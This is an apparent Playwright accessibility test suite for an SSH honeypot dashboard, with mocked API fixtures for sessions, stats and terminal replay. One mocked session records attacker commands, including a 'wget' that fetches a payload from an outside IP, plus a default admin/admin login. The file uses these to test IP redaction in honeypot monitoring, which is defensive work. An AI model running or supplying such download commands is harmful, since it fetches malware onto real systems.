import { test, expect, type Page } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

// The dashboard talks to the API; in CI/preview there is no backend, so we
// stub /api/v1/** with deterministic fixtures. This keeps the e2e hermetic
// (no docker stack) while letting the data-heavy views render real content for
// the accessibility scan.

async function mockApi(page: Page): Promise<void> {
  await page.route('**/api/v1/**', async (route) => {
    const path = new URL(route.request().url()).pathname
    const json = (body: unknown) =>
      route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify(body),
      })

    if (path.endsWith('/stats/totals'))
      return json({ total_sessions: 42, total_auth_attempts: 99, unique_ips: 7 })
    if (path.endsWith('/stats/trend'))
      return json({ current: 42, previous: 30, delta: 12, pct_change: 40 })
    if (path.endsWith('/stats/top-passwords'))
      return json([
        { password: '123456', count: 10 },
        { password: 'root', count: 5 },
      ])
    if (path.endsWith('/stats/top-countries'))
      return json([{ country_code: 'US', country: 'United States', count: 8 }])
    if (path.endsWith('/stats/activity'))
      return json([
        { bucket: '2026-05-29T00:00:00+00:00', count: 4 },
        { bucket: '2026-05-30T00:00:00+00:00', count: 9 },
        { bucket: '2026-05-31T00:00:00+00:00', count: 6 },
      ])
    if (path.endsWith('/stats/heatmap'))
      return json([
        { weekday: 0, hour: 13, count: 7 }, // Sunday cell (0=Sun)
        { weekday: 2, hour: 14, count: 12 },
      ])
    // List has a trailing slash (/sessions/); the detail route does not.
    if (path.endsWith('/sessions/'))
      return json({
        items: [
          {
            id: '726faaebd6b9',
            src_port: 45214,
            dst_port: 2222,
            protocol: 'ssh',
            country: 'United States',
            country_code: 'US',
            started_at: '2026-05-31T13:40:52+00:00',
            ended_at: '2026-05-31T13:41:50+00:00',
            auth_attempt_count: 1,
            command_count: 2,
            has_successful_login: true,
            category: 'active',
          },
        ],
        meta: { page: 1, pages: 1, per_page: 25, total: 1 },
      })
    const sessionMatch = path.match(/\/sessions\/([^/]+)$/)
    if (sessionMatch)
      return json({
        id: sessionMatch[1],
        src_port: 45214,
        dst_ip: '172.23.0.2',
        dst_port: 2222,
        protocol: 'ssh',
        sensor: 'edge-01',
        country: 'United States',
        country_code: 'US',
        started_at: '2026-05-31T13:40:52+00:00',
        ended_at: '2026-05-31T13:41:50+00:00',
        auth_attempts: [
          {
            id: 1,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:38+00:00',
          },
        ],
        commands: [
          { id: 10, input: 'whoami', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
          {
            id: 11,
            input: 'wget http://34.11.136.102/meow',
            success: true,
            timestamp: '2026-05-31T13:41:49+00:00',
          },
        ],
        downloads: [
          {
            id: 1,
            url: 'http://34.11.136.102/meow',
            outfile: 'downloads/x',
            sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
            timestamp: '2026-05-31T13:41:51+00:00',
          },
        ],
      })

    return route.fulfill({
      status: 404,
      contentType: 'application/json',
      body: '{"code":404,"status":"Not Found","message":"Not Found"}',
    })
  })
}

async function expectAxeClean(page: Page): Promise<void> {
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
    .analyze()
  // Map to rule ids for a readable failure message instead of a giant object.
  expect(results.violations.map((v) => v.id)).toEqual([])
}

test.describe('dashboard accessibility smoke', () => {
  test.beforeEach(async ({ page }) => {
    await mockApi(page)
  })

  test('overview renders data and is axe-clean', async ({ page }) => {
    await page.goto('/')
    await expect(page.getByRole('heading', { level: 1, name: 'Overview' })).toBeVisible()
    await expect(page.getByText('Top passwords')).toBeVisible()
    await expectAxeClean(page)
  })

  test('not-found renders and is axe-clean', async ({ page }) => {
    await page.goto('/this-route-does-not-exist')
    await expect(page.getByRole('heading', { level: 1, name: 'Route not found' })).toBeVisible()
    await expectAxeClean(page)
  })

  test('activity renders the heatmap and filters by country, axe-clean', async ({ page }) => {
    await page.goto('/activity')
    await expect(page.getByRole('heading', { level: 1, name: 'Activity' })).toBeVisible()
    await expect(page.getByRole('img', { name: /heatmap/i })).toBeVisible()

    // Country scope is a custom dropdown shared with Sessions.
    await page.getByRole('button', { name: /Country/ }).click()
    await page.getByRole('option', { name: 'United States' }).click()
    await expect(page).toHaveURL(/country=US/)

    await expectAxeClean(page)
  })

  test('sessions list opens a terminal replay with IPs blotted, axe-clean', async ({ page }) => {
    await page.goto('/sessions')
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
    await expectAxeClean(page)

    await page.getByRole('link', { name: /726faaebd6b9/ }).click()
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9/)

    const term = page.getByRole('region', { name: /terminal replay/i })
    await expect(term).toBeVisible()
    await expect(term).toContainText('whoami')
    await expect(term).toContainText('‹ip›')
    await expect(term).not.toContainText('34.11.136.102')

    // The Sessions nav tab stays active on the detail route (exact name so the
    // "← All sessions" back-link doesn't also match).
    await expect(page.getByRole('link', { name: 'Sessions', exact: true })).toHaveClass(
      /nav-link-active/,
    )
    await expectAxeClean(page)
  })

  test('sessions filters render badges and drive the URL, axe-clean', async ({ page }) => {
    await page.goto('/sessions')
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()

    // Classification badge (the mocked session ran commands -> "CLI"). The badge
    // renders in both the table and the (desktop-hidden) mobile card list, so
    // target the first/visible one.
    await expect(page.getByText('CLI', { exact: true }).first()).toBeVisible()

    // Filters are custom dropdowns, URL-driven.
    await page.getByRole('button', { name: /^Show/ }).click()
    await page.getByRole('option', { name: 'CLI' }).click()
    await expect(page).toHaveURL(/category=active/)

    await page.getByRole('button', { name: /^Sort/ }).click()
    await page.getByRole('option', { name: 'Country A–Z' }).click()
    await expect(page).toHaveURL(/sort=country/)

    await expectAxeClean(page)
  })

  test('a failed sessions load shows the error boundary and recovers', async ({ page }) => {
    // Override the list endpoint with a 500 (LIFO: this handler wins over the
    // beforeEach mock). The view awaits suspense, so the rejection bubbles to the
    // App-level ErrorBoundary outside <Suspense>.
    let fail = true
    // Regex (not glob) so the query-string list URL (/sessions/?page=...) matches
    // but the detail route (/sessions/<id>) does not.
    await page.route(/\/api\/v1\/sessions\/(\?|$)/, async (route) => {
      if (fail)
        return route.fulfill({
          status: 500,
          contentType: 'application/json',
          body: '{"code":500,"status":"Internal Server Error","message":"boom"}',
        })
      return route.fallback()
    })

    await page.goto('/sessions')
    // The list query retries 5xx twice with backoff before the boundary catches.
    const alert = page.getByRole('alert')
    await expect(alert).toBeVisible({ timeout: 15_000 })
    await expect(alert).toContainText('Something went wrong')

    // "Try again" resets the query and refetches; lift the failure first.
    fail = false
    await alert.getByRole('button', { name: 'Try again' }).click()
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
  })
})
